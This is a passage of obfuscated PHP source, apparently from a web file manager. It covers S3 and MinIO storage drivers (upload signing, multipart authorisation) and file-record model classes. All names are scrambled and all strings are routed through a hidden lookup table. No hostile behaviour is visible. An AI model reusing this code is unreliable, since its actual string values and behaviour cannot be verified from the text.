rawurlencode($’ºÓ‡÷); } else { } $Ã¸ÚşÆğ = $this->link($¢à¡˜†Ø, $ì“çèø); $this->fileOutLink($Ã¸ÚşÆğ); } public function fileOutServer($¤õ“Ëòƒ, $ãØ«ÍÍ™ = false, $¨Å´’Ò­ = false, $£æùç…¤ = '') { parent::fileOut($¤õ“Ëòƒ, $ãØ«ÍÍ™, $¨Å´’Ò­, $£æùç…¤); } public function fileOutImageServer($–Ãòí¨¯, $àÈİ³©— = 250) { parent::fileOutImage($–Ãòí¨¯, $àÈİ³©—); } public function fileOutLink($äŞÏª“³) { $èƒËÀÂÌ =& $_SERVER[€ä¾™²]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($èƒËÀÂÌ[67], $èƒËÀÂÌ[66], $èƒËÀÂÌ[68])) && !get_url_scheme($this->endpoint) && substr($äŞÏª“³, 0, 7) == $èƒËÀÂÌ[217]) { $äŞÏª“³ = $èƒËÀÂÌ[218] . substr($äŞÏª“³, 7); } header($èƒËÀÂÌ[173] . $äŞÏª“³); die; } public function hashMd5($ş¦‹ÙÛ, $œÓµ†‚Ó = '') { $æßæˆÀ = $this->objectMeta($ş¦‹ÙÛ); if (!$æßæˆÀ) { return !1; } $œÓµ†‚Ó = $œÓµ†‚Ó ? $œÓµ†‚Ó : _get($æßæˆÀ, $_SERVER[€ä¾™²][253]); return $œÓµ†‚Ó; } public function uploadFormData($ÛËşÁì°, $ ü¥øĞª = 3600) { $³¦å¯»õ =& $_SERVER[€ä¾™²]; if (!$this->_isClientAsync()) { $Ó¡¯§½æ = $this->getPreSignedURL($ÛËşÁì°, $ ü¥øĞª, array(), $³¦å¯»õ[254]); return array($³¦å¯»õ[207] => str_replace($³¦å¯»õ[217], $³¦å¯»õ[255], $Ó¡¯§½æ)); } if (isset($GLOBALS[$³¦å¯»õ[6]][$³¦å¯»õ[92]][$³¦å¯»õ[256]]) && $GLOBALS[$³¦å¯»õ[6]][$³¦å¯»õ[92]][$³¦å¯»õ[256]] == $³¦å¯»õ[229]) { return $this->uploadMultiData($ÛËşÁì°, $ ü¥øĞª); } if ($this->signVer == $³¦å¯»õ[248]) { return $this->uploadFormDataV2($ÛËşÁì°, $ ü¥øĞª); } return $this->uploadFormDataV4($ÛËşÁì°, $ ü¥øĞª); } public function uploadFormDataV2($…–ÇêÈæ, $¯»ã×²× = 3600) { $åşé·†ü =& $_SERVER[€ä¾™²]; $ûŒä« = $this->pathFather($…–ÇêÈæ); $øÀÅ±­Ä = $this->client->getHttpUploadPostParams($this->bucket, $ûŒä«, $åşé·†ü[230], $¯»ã×²×); $ğÚÌÂß† = array_merge((array) $øÀÅ±­Ä, array($åşé·†ü[257] => $åşé·†ü[248], $åşé·†ü[207] => $this->getHost())); if ($this->_isClientAsync()) { unset($ğÚÌÂß†[$åşé·†ü[257]]); } return $ğÚÌÂß†; } public function uploadFormDataV4($Ø™ƒÙÕ£, $ş˜ïÉ„ = 3600) { $ä½êƒòê =& $_SERVER[€ä¾™²]; $©­Åéßµ = $ä½êƒòê[230]; $š©‘®Ê = $ä½êƒòê[258]; $›…Õ‚¼í = $ä½êƒòê[62]; $…ŒğòÒä = gmdate($ä½êƒòê[259]); $Ü¬Ÿ°àÅ = gmdate($ä½êƒòê[260]); $í†¨å = $ä½êƒòê[261]; $¬İÏÍÏ‡ = $ş˜ïÉ„ . $ä½êƒòê[12]; $âÀãáš  = $ä½êƒòê[262]; $ÃÅ¬åÁõ = array($this->accessKey, $Ü¬Ÿ°àÅ, $this->region, $›…Õ‚¼í, $í†¨å); $¯§Š¹Ÿ¼ = implode($ä½êƒòê[8], $ÃÅ¬åÁõ); $‡Øä©ìÏ = array($ä½êƒòê[263] => gmdate($ä½êƒòê[264], strtotime($ä½êƒòê[265])), $ä½êƒòê[266] => array(array($ä½êƒòê[267] => $this->bucket), array($ä½êƒòê[268], $ä½êƒòê[269], $ä½êƒòê[12]), array($ä½êƒòê[268], $ä½êƒòê[270], $ä½êƒòê[12]), array($ä½êƒòê[271] => $âÀãáš ), array($ä½êƒòê[272] => $¯§Š¹Ÿ¼), array($ä½êƒòê[273] => $š©‘®Ê), array($ä½êƒòê[274] => $…ŒğòÒä), array($ä½êƒòê[275] => $¬İÏÍÏ‡))); $¥¦¶…İÊ = base64_encode(json_encode($‡Øä©ìÏ)); $ì””±™Ğ = hash_hmac($ä½êƒòê[276], $Ü¬Ÿ°àÅ, $ä½êƒòê[277] . $this->secret, !0); $Ó¸‡ó¶£ = hash_hmac($ä½êƒòê[276], $this->region, $ì””±™Ğ, !0); $ï¯ûêÜà = hash_hmac($ä½êƒòê[276], $›…Õ‚¼í, $Ó¸‡ó¶£, !0); $Ñ¬—äù‘ = hash_hmac($ä½êƒòê[276], $í†¨å, $ï¯ûêÜà, !0); $İ«£Åş³ = hash_hmac($ä½êƒòê[276], $¥¦¶…İÊ, $Ñ¬—äù‘); $¢ñùëŞÒ = array($ä½êƒòê[247] => $ä½êƒòê[12], $ä½êƒòê[271] => $âÀãáš , $ä½êƒòê[278] => $¥¦¶…İÊ, $ä½êƒòê[272] => $¯§Š¹Ÿ¼, $ä½êƒòê[273] => $š©‘®Ê, $ä½êƒòê[274] => $…ŒğòÒä, $ä½êƒòê[275] => $¬İÏÍÏ‡, $ä½êƒòê[279] => $İ«£Åş³, $ä½êƒòê[257] => $ä½êƒòê[248], $ä½êƒòê[207] => $this->getHost()); if ($this->_isClientAsync()) { unset($¢ñùëŞÒ[$ä½êƒòê[257]]); } return $¢ñùëŞÒ; } public function uploadMultiData($™Ø®ã¸á, $ëëåÉÆØ = 3600) { $æÚÀ‘õ¸ =& $_SERVER[€ä¾™²]; $¨õ‚²¡ = $this->signVer == $æÚÀ‘õ¸[248] ? gmdate($æÚÀ‘õ¸[280]) : gmdate($æÚÀ‘õ¸[281]); $¢„î²ÕÅ = array(); $‚ñ ß±– = $this->client->getUploadId($this->bucket, $™Ø®ã¸á, $¢„î²ÕÅ); if (!$‚ñ ß±–) { return !1; } $Ñºû¤÷ = array($æÚÀ‘õ¸[282] => $‚ñ ß±–, $æÚÀ‘õ¸[207] => $this->getHost() . $æÚÀ‘õ¸[8] . $this->pathEncode($™Ø®ã¸á), $æÚÀ‘õ¸[283] => $¨õ‚²¡, $æÚÀ‘õ¸[95] => $™Ø®ã¸á, $æÚÀ‘õ¸[257] => $this->signVer); if ($this->_isClientAsync()) { unset($Ñºû¤÷[$æÚÀ‘õ¸[257]]); } return $Ñºû¤÷; } public function uploadMultiAuth($ğõóÌ£°, $ª·ßø‚ = array()) { $¦«îÃªÍ =& $_SERVER[€ä¾™²]; if ($this->signVer == $¦«îÃªÍ[248]) { if (isset($ª·ßø‚[$¦«îÃªÍ[284]])) { return $this->uploadPartAuthV2($ğõóÌ£°, $ª·ßø‚); } return $this->uploadListAuthV2($ğõóÌ£°, $ª·ßø‚); } if (isset($ª·ßø‚[$¦«îÃªÍ[284]])) { return $this->uploadPartAuthV4($ğõóÌ£°, $ª·ßø‚); } return $this->uploadListAuthV4($ğõóÌ£°, $ª·ßø‚); } public function uploadPartAuthV2($±ÜÀ‰çö, $ïŒªäœş = array()) { $ëºŠìÎ” =& $_SERVER[€ä¾™²]; $€²â•º = $ïŒªäœş[$ëºŠìÎ”[95]]; $ÍèøÄà³ = gmdate($ëºŠìÎ”[280]); $õãúëÑ“ = array_intersect_key($ïŒªäœş, array_flip(array($ëºŠìÎ”[284], $ëºŠìÎ”[282]))); ksort($õãúëÑ“); $é‰ôÊ€ı = $õãúëÑ“ ? $ëºŠìÎ”[76] . http_build_query($õãúëÑ“, null, $ëºŠìÎ”[285], PHP_QUERY_RFC3986) : $ëºŠìÎ”[12]; $ÛãÏ²Ñş = array($ëºŠìÎ”[254], $ëºŠìÎ”[12], $ëºŠìÎ”[121], $ëºŠìÎ”[12], "\x78\x2d\141\155\x7a\55\x64\x61\x74\x65\72{$ÍèøÄà³}", $ëºŠìÎ”[8] . $this->bucket . $ëºŠìÎ”[8] . $this->pathEncode($€²â•º) . $é‰ôÊ€ı); $€«ÄµÂ¯ = implode($ëºŠìÎ”[286], $ÛãÏ²Ñş); $ÌÓ€úùé = $this->client->__getSignature($€«ÄµÂ¯); return array($ëºŠìÎ”[287] => $ÌÓ€úùé, $ëºŠìÎ”[283] => $ÍèøÄà³); } public function uploadListAuthV2($¢¶›®›À, $Œş—±¨ = array()) { $²ˆÅÔä =& $_SERVER[€ä¾™²]; $¦ğ‡œà¢ = $Œş—±¨[$²ˆÅÔä[95]]; $¯¯°Ûï® = $Œş—±¨[$²ˆÅÔä[282]]; $ò½Êê× = $this->client->listParts($this->bucket, $¦ğ‡œà¢, $¯¯°Ûï®); if (!$ò½Êê×) { return !1; } $ˆ¨Ÿ‰Úã = gmdate($²ˆÅÔä[280]); $õ‰ÄÏğá = $²ˆÅÔä[288] . $¯¯°Ûï®; $°æàĞ—Ô = array($²ˆÅÔä[289], $²ˆÅÔä[12], $²ˆÅÔä[121], $²ˆÅÔä[12], "\x78\55\x61\x6d\172\55\144\x61\x74\145\72{$ˆ¨Ÿ‰Úã}", $²ˆÅÔä[8] . $this->bucket . $²ˆÅÔä[8] . $this->pathEncode($¦ğ‡œà¢) . $õ‰ÄÏğá); $‹½µçë = implode($²ˆÅÔä[286], $°æàĞ—Ô); $É˜Ï¾¿ô = $this->client->__getSignature($‹½µçë); return array($²ˆÅÔä[287] => $É˜Ï¾¿ô, $²ˆÅÔä[283] => $ˆ¨Ÿ‰Úã, $²ˆÅÔä[290] => $ò½Êê×); } public function uploadPartAuthV4($Ô¦Á³¬ü, $°Ê°Ó‚µ = array()) { $‘¡¸ò¬Š =& $_SERVER[€ä¾™²]; $ùä€ƒß· = $°Ê°Ó‚µ[$‘¡¸ò¬Š[95]]; $„şÎİ½¨ = array($‘¡¸ò¬Š[274] => gmdate($‘¡¸ò¬Š[281]), $‘¡¸ò¬Š[291] => _get($°Ê°Ó‚µ, $‘¡¸ò¬Š[292], hash($‘¡¸ò¬Š[276], $‘¡¸ò¬Š[12]))); $°‚¬ª = explode($‘¡¸ò¬Š[209], $this->getHost()); $„ô¿€öı = array($‘¡¸ò¬Š[293] => $°‚¬ª[1], $‘¡¸ò¬Š[294] => $‘¡¸ò¬Š[12], $‘¡¸ò¬Š[247] => $‘¡¸ò¬Š[121], $‘¡¸ò¬Š[295] => $°Ê°Ó‚µ[$‘¡¸ò¬Š[79]]); $Æ¦î»Ş = $‘¡¸ò¬Š[254]; $û­ºç» = $‘¡¸ò¬Š[8] . $this->pathEncode($ùä€ƒß·); $”ëÓíèë = array_intersect_key($°Ê°Ó‚µ, array_flip(array($‘¡¸ò¬Š[284], $‘¡¸ò¬Š[282]))); $÷Œ¿âªÃ = $this->client->__getSignatureV4($„şÎİ½¨, $„ô¿€öı, $Æ¦î»Ş, $û­ºç», $”ëÓíèë); return array($‘¡¸ò¬Š[287] => $÷Œ¿âªÃ, $‘¡¸ò¬Š[291] => $„şÎİ½¨[$‘¡¸ò¬Š[291]], $‘¡¸ò¬Š[283] => $„şÎİ½¨[$‘¡¸ò¬Š[274]]); } public function uploadListAuthV4($ó´¿ùÎ„, $—õ¶Ê÷ã = array()) { $áÄì‹ß¬ =& $_SERVER[€ä¾™²]; $ßåéÂ¼ = $—õ¶Ê÷ã[$áÄì‹ß¬[95]]; $Ô™ƒ­Ó½ = $—õ¶Ê÷ã[$áÄì‹ß¬[282]]; $€’’ÊıÁ = $this->client->listParts($this->bucket, $ßåéÂ¼, $Ô™ƒ­Ó½); if (!$€’’ÊıÁ) { return !1; } $üùøÕ±¢ = $áÄì‹ß¬[296]; foreach ($€’’ÊıÁ as $«÷ü‚ˆ¦) { $üùøÕ±¢ .= $áÄì‹ß¬[297] . "\74\120\141\162\164\x4e\x75\155\142\145\x72\76{$«÷ü‚ˆ¦[$áÄì‹ß¬[298]]}\x3c\x2f\120\141\x72\164\x4e\x75\155\x62\145\x72\76\12" . "\x3c\105\x54\141\x67\x3e{$«÷ü‚ˆ¦[$áÄì‹ß¬[299]]}\74\x2f\105\124\x61\147\76\xa" . $áÄì‹ß¬[300]; } $üùøÕ±¢ .= $áÄì‹ß¬[301]; $ùóØó‡ = array($áÄì‹ß¬[274] => gmdate($áÄì‹ß¬[281]), $áÄì‹ß¬[291] => hash($áÄì‹ß¬[276], $üùøÕ±¢)); $´ëä¸ª¸ = explode($áÄì‹ß¬[209], $this->getHost()); $†¥Æô™¼ = array($áÄì‹ß¬[293] => $´ëä¸ª¸[1], $áÄì‹ß¬[247] => $áÄì‹ß¬[121], $áÄì‹ß¬[295] => strlen($üùøÕ±¢)); $ÁÀ²–§ = $áÄì‹ß¬[289]; $ä³ò‘… = $áÄì‹ß¬[8] . $this->pathEncode($ßåéÂ¼); $µ¶šì = array($áÄì‹ß¬[282] => $Ô™ƒ­Ó½); $û¹™«³é = $this->client->__getSignatureV4($ùóØó‡, $†¥Æô™¼, $ÁÀ²–§, $ä³ò‘…, $µ¶šì); return array($áÄì‹ß¬[287] => $û¹™«³é, $áÄì‹ß¬[291] => $ùóØó‡[$áÄì‹ß¬[291]], $áÄì‹ß¬[283] => $ùóØó‡[$áÄì‹ß¬[274]], $áÄì‹ß¬[290] => $€’’ÊıÁ); } private function _isClientAsync() { $Âş øí =& $_SERVER[€ä¾™²]; static $ÜÙ´Ş¤ = null; if ($ÜÙ´Ş¤ === null) { $ï¦¬’‚ = isset($_REQUEST[$Âş øí[302]]) ? json_decode($_REQUEST[$Âş øí[302]], !0) : !1; $ÜÙ´Ş¤ = $ï¦¬’‚ && _get($ï¦¬’‚, $Âş øí[303]) == $Âş øí[304]; } return $ÜÙ´Ş¤; } public function getHost() { $‹˜âİ×È =& $_SERVER[€ä¾™²]; $ø¦²ç½½ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($‹˜âİ×È[70], $‹˜âİ×È[64], $‹˜âİ×È[69], $‹˜âİ×È[62]))) { return $ø¦²ç½½ . $‹˜âİ×È[8] . $this->bucket; } if ($this->osType == $‹˜âİ×È[62] && !is_domain($ø¦²ç½½)) { return $ø¦²ç½½ . $‹˜âİ×È[8] . $this->bucket; } $ø¦²ç½½ = explode($‹˜âİ×È[209], $ø¦²ç½½); return $ø¦²ç½½[0] . $‹˜âİ×È[209] . $this->bucket . $‹˜âİ×È[10] . $ø¦²ç½½[1]; } public function size($ëºÑ¬á) { $åÒë¼Ö = $this->objectMeta($ëºÑ¬á); return $åÒë¼Ö ? $åÒë¼Ö[$_SERVER[€ä¾™²][79]] : 0; } public function info($‰»Í³£“) { if ($this->isFolder($‰»Í³£“)) { return $this->folderInfo($‰»Í³£“); } else { if ($this->isFile($‰»Í³£“)) { return $this->fileInfo($‰»Í³£“); } } return !1; } public function exist($¹ÏùÔšš) { return $this->isFile($¹ÏùÔšš) || $this->isFolder($¹ÏùÔšš); } public function isFile($›½ Ú¢Œ) { return !$this->isFolder($›½ Ú¢Œ) && $this->objectMeta($›½ Ú¢Œ); } public function isFolder($ıÏçú¡†) { return $this->cacheMethod($_SERVER[€ä¾™²][178], $ıÏçú¡†); } protected function objectMeta($¼¥ïÕ‘Õ) { return $this->cacheMethod($_SERVER[€ä¾™²][180], $¼¥ïÕ‘Õ); } protected function _objectMeta($¨ë™») { $¤“µÔ„€ =& $_SERVER[€ä¾™²]; $¨ë™» = rtrim($¨ë™», $¤“µÔ„€[8]); try { $³İ•Ó¯À = $this->client->getObjectInfo($this->bucket, $¨ë™»); if (!isset($³İ•Ó¯À[$¤“µÔ„€[253]]) && isset($³İ•Ó¯À[$¤“µÔ„€[305]])) { $³İ•Ó¯À[$¤“µÔ„€[253]] = $³İ•Ó¯À[$¤“µÔ„€[305]]; } } catch (Exception $ÑöÆ¿È) { $³İ•Ó¯À = !1; } if (!$³İ•Ó¯À) { } return $³İ•Ó¯À; } protected function _isFolder($‚å–ù–§) { $Î¾¿ï‡‡ =& $_SERVER[€ä¾™²]; $‚å–ù–§ = rtrim($‚å–ù–§, $Î¾¿ï‡‡[8]) . $Î¾¿ï‡‡[8]; if ($‚å–ù–§ == $Î¾¿ï‡‡[12] || $‚å–ù–§ == $Î¾¿ï‡‡[8]) { return !0; } $ÜœÚ•¶ = $this->client->getBucket($this->bucket, $‚å–ù–§, null, 1); if (empty($ÜœÚ•¶[$Î¾¿ï‡‡[237]])) { return !1; } $ıÊ¾À»ù = $ÜœÚ•¶[$Î¾¿ï‡‡[237]][0][$Î¾¿ï‡‡[32]]; return stripos($ıÊ¾À»ù, $‚å–ù–§) === 0 ? !0 : !1; if (substr($ıÊ¾À»ù, -1) == $Î¾¿ï‡‡[8]) { return !0; } if (get_path_this($ıÊ¾À»ù) == get_path_this($‚å–ù–§)) { return !1; } return !0; } public function listObject($í—ôì€ä) { return $this->fileList($í—ôì€ä, $_SERVER[€ä¾™²][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Í³¬ş ) { $ßÎ•Š =& $_SERVER[€ä¾™²]; parent::__construct($Í³¬ş ); $this->setSignVersion($ßÎ•Š[248]); if (!$this->region) { $this->region = $ßÎ•Š[306]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($»è³¦Ñ–, $¼‰óÄ¡ = 3600) { $¤‘˜ãâÔ =& $_SERVER[€ä¾™²]; $»Ê¡¶‡Ï = $¤‘˜ãâÔ[230]; $ä‡ßâá« = $¤‘˜ãâÔ[258]; $¤úŸğ¡¶ = $¤‘˜ãâÔ[62]; $„ŠÔÌŒ = gmdate($¤‘˜ãâÔ[259]); $€Â÷çÀ = gmdate($¤‘˜ãâÔ[260]); $”×³³¥ = $¤‘˜ãâÔ[261]; $¦•ˆğø = $¼‰óÄ¡ . $¤‘˜ãâÔ[12]; $ ÏÚ©× = $¤‘˜ãâÔ[262]; $İ›“ß™ƒ = array($this->accessKey, $€Â÷çÀ, $this->region, $¤úŸğ¡¶, $”×³³¥); $Ù¸¤Î— = implode($¤‘˜ãâÔ[8], $İ›“ß™ƒ); $õÜ»œ× = array($¤‘˜ãâÔ[263] => gmdate($¤‘˜ãâÔ[264], strtotime($¤‘˜ãâÔ[265])), $¤‘˜ãâÔ[266] => array(array($¤‘˜ãâÔ[267] => $this->bucket), array($¤‘˜ãâÔ[307] => $»Ê¡¶‡Ï), array($¤‘˜ãâÔ[268], $¤‘˜ãâÔ[269], $¤‘˜ãâÔ[12]), array($¤‘˜ãâÔ[268], $¤‘˜ãâÔ[270], $¤‘˜ãâÔ[12]), array($¤‘˜ãâÔ[268], $¤‘˜ãâÔ[308], $¤‘˜ãâÔ[12]), array($¤‘˜ãâÔ[271] => $ ÏÚ©×), array($¤‘˜ãâÔ[272] => $Ù¸¤Î—), array($¤‘˜ãâÔ[273] => $ä‡ßâá«), array($¤‘˜ãâÔ[274] => $„ŠÔÌŒ), array($¤‘˜ãâÔ[275] => $¦•ˆğø))); $°­ù²ìë = base64_encode(json_encode($õÜ»œ×)); $‹µñÕ¤Ï = hash_hmac($¤‘˜ãâÔ[276], $€Â÷çÀ, $¤‘˜ãâÔ[277] . $this->secret, !0); $Ê½“€şº = hash_hmac($¤‘˜ãâÔ[276], $this->region, $‹µñÕ¤Ï, !0); $Ä¸“£ˆ¼ = hash_hmac($¤‘˜ãâÔ[276], $¤úŸğ¡¶, $Ê½“€şº, !0); $ë÷•“´ = hash_hmac($¤‘˜ãâÔ[276], $”×³³¥, $Ä¸“£ˆ¼, !0); $òóôª‡á = hash_hmac($¤‘˜ãâÔ[276], $°­ù²ìë, $ë÷•“´); $Ÿô‚«®” = array($¤‘˜ãâÔ[247] => $¤‘˜ãâÔ[12], $¤‘˜ãâÔ[295] => $¤‘˜ãâÔ[12], $¤‘˜ãâÔ[307] => $»Ê¡¶‡Ï, $¤‘˜ãâÔ[271] => $ ÏÚ©×, $¤‘˜ãâÔ[278] => $°­ù²ìë, $¤‘˜ãâÔ[309] => $Ù¸¤Î—, $¤‘˜ãâÔ[310] => $ä‡ßâá«, $¤‘˜ãâÔ[311] => $„ŠÔÌŒ, $¤‘˜ãâÔ[312] => $¦•ˆğø, $¤‘˜ãâÔ[313] => $òóôª‡á, $¤‘˜ãâÔ[207] => $this->getHost()); return $Ÿô‚«®”; } } goto D¬†ßŒî¯¾; eÄõñ¹¡†·: class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\x65\x5f\x63\157\156\164\145\156\x74\163"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\151\x6d\145", "\x74\151\155\x65", "\x69\156\163\145\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\145"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\x69\157\x5f\x66\x69\154\145\x5f\x6d\145\x74\x61", "\155\145\164\141\106\x69\145\x6c\144" => "\x66\x69\154\x65\111\x44"); public function fileInfo($æƒµÙˆ„) { $­âÖ¹ ó =& $_SERVER[€ä¾™²]; static $İ¸…«‘Ù = array(); if (!isset($İ¸…«‘Ù[$æƒµÙˆ„])) { $’ôµÁ … = $­âÖ¹ ó[2177]; $ÇÕ©ù·Ü = Model($­âÖ¹ ó[567])->field($’ôµÁ …)->where(array($­âÖ¹ ó[565] => $æƒµÙˆ„))->find(); $İ¸…«‘Ù[$æƒµÙˆ„] = $ÇÕ©ù·Ü; } return $İ¸…«‘Ù[$æƒµÙˆ„]; } public function addFileByContent($ıÅ‡ªµ™ = '', $—±×Åê, $É›ñ¿ƒÌ = '') { $Üù·¤ñĞ =& $_SERVER[€ä¾™²]; $À¹æšá = TEMP_PATH . $Üù·¤ñĞ[2178]; if (!is_dir($À¹æšá)) { mk_dir($À¹æšá); } $‚œ¤¤Ä = $À¹æšá . $Üù·¤ñĞ[2179] . rand_string(16); $Ö°ñ•–Ã = file_put_contents($‚œ¤¤Ä, $ıÅ‡ªµ™); if ($Ö°ñ•–Ã === !1 || strlen($ıÅ‡ªµ™) != $Ö°ñ•–Ã) { return !1; } $Øë¥äû¬ = $this->addFile($‚œ¤¤Ä, $—±×Åê, $É›ñ¿ƒÌ, !0); if (file_exists($‚œ¤¤Ä)) { @unlink($‚œ¤¤Ä); } return $Øë¥äû¬; } public function createFileName($ÜÛäˆÙõ, $†Õ“¨¦÷, $êçĞğ¨ = false, $è–ï„—à = false) { $áÁúßà— =& $_SERVER[€ä¾™²]; $í‘­…Ï² = IO::init($áÁúßà—[8]); $ÏÅĞßÃÁ = $this->_makeFilePath($ÜÛäˆÙõ, $†Õ“¨¦÷, $í‘­…Ï², $êçĞğ¨, $è–ï„—à); $Ôï¶¶Û™ = $í‘­…Ï²->pathFather($ÏÅĞßÃÁ); static $Ô±ÆÛ–˜ = false; $„æ†É—‚ = $áÁúßà—[2180] . md5($Ôï¶¶Û™); if (!$Ô±ÆÛ–˜ && !Cache::get($„æ†É—‚)) { $Ô±ÆÛ–˜ = !0; $‘¶¢•ù = IO::mkdir($Ôï¶¶Û™); if (!IO::exist($‘¶¢•ù . $áÁúßà—[901])) { IO::mkfile($‘¶¢•ù . $áÁúßà—[901]); } Cache::set($„æ†É—‚, 1, 3600 * 2); } return $ÏÅĞßÃÁ; } public function _makeFilePath($“œªáµ², $ ´ìË†ë, $À€¶±ñ“, $¿´ıÖáŒ = false, $€Ò±„†´ = false) { $üÑåôù =& $_SERVER[€ä¾™²]; $³ã³„Œ˜ = Model($üÑåôù[873])->get($üÑåôù[2181]); $¾ßù ÆÎ = $üÑåôù[1371] . $ ´ìË†ë[$üÑåôù[486]] . $üÑåôù[506] . date($üÑåôù[2182]); $ä®ğÃ« = $¾ßù ÆÎ . rand_string(5) . short_id(100); $“œªáµ² = str_replace($üÑåôù[8], $üÑåôù[11], KodIO::clear($“œªáµ²)); $ñ©ëó¬¾ = $À€¶±ñ“->ext($“œªáµ²); if (!$“œªáµ²) { $³ã³„Œ˜ = $üÑåôù[879]; } switch ($³ã³„Œ˜) { case $üÑåôù[2183]: if ($ñ©ëó¬¾) { $ä®ğÃ« = $ä®ğÃ« . $üÑåôù[10] . $ñ©ëó¬¾; } if ($ñ©ëó¬¾ == $üÑåôù[2121]) { $ä®ğÃ« .= $üÑåôù[1340]; } break; case $üÑåôù[2184]: $ßŸõú† = Model($üÑåôù[873])->get($üÑåôù[874]); $±Êû´½Ù = substr(md5($üÑåôù[875] . $ßŸõú† . date($üÑåôù[849])), 0, 8); $¾ßù ÆÎ = $üÑåôù[1371] . $ ´ìË†ë[$üÑåôù[486]] . $üÑåôù[506] . date($üÑåôù[2185]) . $±Êû´½Ù . $üÑåôù[8]; if ($ñ©ëó¬¾ == $üÑåôù[2121]) { $“œªáµ² .= $üÑåôù[1340]; } $å½ÅğÁ² = $üÑåôù[2186] . $¾ßù ÆÎ . $“œªáµ²; CacheLock::lock($å½ÅğÁ²); $ä®ğÃ« = $¾ßù ÆÎ . $“œªáµ²; if (IO::exist($¾ßù ÆÎ . $“œªáµ²)) { $ÀÇù¯´ = substr($“œªáµ², 0, strlen($“œªáµ²) - strlen($ñ©ëó¬¾)); $ˆ»Ë©î  = $€Ò±„†´ ? substr($€Ò±„†´, 0, 5) : ($¿´ıÖáŒ ? substr($¿´ıÖáŒ, 0, 5) : rand_string(5)); $ˆ»Ë©î  .= rand_string(3); $ä®ğÃ« = $¾ßù ÆÎ . $ÀÇù¯´ . $ˆ»Ë©î ; if ($ñ©ëó¬¾) { $ä®ğÃ« = $ä®ğÃ« . $üÑåôù[10] . $ñ©ëó¬¾; } } if (IO::isOsDriver($ä®ğÃ«) && !IO::isUploadServer($ä®ğÃ«)) { if (IO::exist($ä®ğÃ«)) { CacheLock::unlock($å½ÅğÁ²); return $ä®ğÃ«; } $äù Í’õ = IO::setContent($ä®ğÃ«, $üÑåôù[12]); if (!$äù Í’õ) { show_json($üÑåôù[2187], !1); } } CacheLock::unlock($å½ÅğÁ²); break; case $üÑåôù[879]: break; default: break; } return $ä®ğÃ«; } public function addFileByRemote($——ê¢ñ, $¬†æÂŒ€, $¦ĞÇ¼í = array()) { $©Ë Î„• =& $_SERVER[€ä¾™²]; if (!IO::isFile($——ê¢ñ)) { return !1; } $ñâığ¾» = $¦ĞÇ¼í[$©Ë Î„•[570]] ? $¦ĞÇ¼í[$©Ë Î„•[570]] : $©Ë Î„•[12]; $¢Ò‹ë‹ö = IO::hashMd5($——ê¢ñ, $ñâığ¾»); $ƒƒ€ÜÂÜ = KodIO::parse($——ê¢ñ); $Ç×¶ôóÛ = array($©Ë Î„•[647] => IO::size($——ê¢ñ), $©Ë Î„•[2188] => 1, $©Ë Î„•[516] => $¬†æÂŒ€, $©Ë Î„•[915] => $ƒƒ€ÜÂÜ[$©Ë Î„•[486]], $©Ë Î„•[517] => $——ê¢ñ, $©Ë Î„•[2189] => $¦ĞÇ¼í[$©Ë Î„•[701]] ? $¦ĞÇ¼í[$©Ë Î„•[701]] : IO::hashSimple($——ê¢ñ), $©Ë Î„•[2190] => $¢Ò‹ë‹ö ? $¢Ò‹ë‹ö : $ñâığ¾»); if ($çÊµ’™ô = $this->addFileCheckExist($Ç×¶ôóÛ[$©Ë Î„•[701]], $Ç×¶ôóÛ[$©Ë Î„•[570]], $Ç×¶ôóÛ[$©Ë Î„•[79]])) { return $çÊµ’™ô; } return $this->addFileData($Ç×¶ôóÛ); } private function addFileData($Ù²—¹Ó‡) { $Ù‘Ä©ü =& $_SERVER[€ä¾™²]; if (!$Ù²—¹Ó‡) { return !1; } if (!IO::isFile($Ù²—¹Ó‡[$Ù‘Ä©ü[87]])) { return !1; } $Ù²—¹Ó‡[$Ù‘Ä©ü[79]] = intval($Ù²—¹Ó‡[$Ù‘Ä©ü[79]]); if (!$Ù²—¹Ó‡[$Ù‘Ä©ü[79]] && strlen($Ù²—¹Ó‡[$Ù‘Ä©ü[701]]) > 32) { $Ù²—¹Ó‡[$Ù‘Ä©ü[79]] = intval(substr($Ù²—¹Ó‡[$Ù‘Ä©ü[701]], 32)); } $øâŒ±³ = $this->add($Ù²—¹Ó‡); return $this->find($øâŒ±³); } public function addFile($È‘Ğ€¡É, $Ë²¶“¨ó, $šº¹³’š, $ÎæÛ… = false) { $³íŞš =& $_SERVER[€ä¾™²]; $îêƒµ©Ü = IO::hashSimple($È‘Ğ€¡É); $íİ˜ÄÊÉ = IO::size($È‘Ğ€¡É); $¿…€È×Í = $íİ˜ÄÊÉ <= 1024 * 1024 * 10 ? IO::hashMd5($È‘Ğ€¡É) : $³íŞš[12]; $â±Å‰ë = $³íŞš[2191] . $îêƒµ©Ü; CacheLock::lock($â±Å‰ë); if ($¿…€È×Í && $îêƒµ©Ü) { $¤Š”ö³Ğ = $this->addFileCheckExist($îêƒµ©Ü, $¿…€È×Í, $íİ˜ÄÊÉ); if ($¤Š”ö³Ğ) { CacheLock::unlock($â±Å‰ë); return $¤Š”ö³Ğ; } } $åŞ”ŠØÌ = $this->addFileMake($È‘Ğ€¡É, $Ë²¶“¨ó, $íİ˜ÄÊÉ, $îêƒµ©Ü, $¿…€È×Í, $šº¹³’š, $ÎæÛ…); $à£éÒ£ = $this->addFileData($åŞ”ŠØÌ); if (!$à£éÒ£) { return !1; } CacheLock::unlock($â±Å‰ë); if (!$¿…€È×Í && $à£éÒ£) { $this->fileMd5Check($à£éÒ£); } return $à£éÒ£; } public function fileMd5Check($“îûã®é) { $Ï²¾×ó‚ =& $_SERVER[€ä¾™²]; $€ƒšİÙ€ = array($“îûã®é[$Ï²¾×ó‚[564]], $“îûã®é[$Ï²¾×ó‚[87]]); $Êé±òŒ = 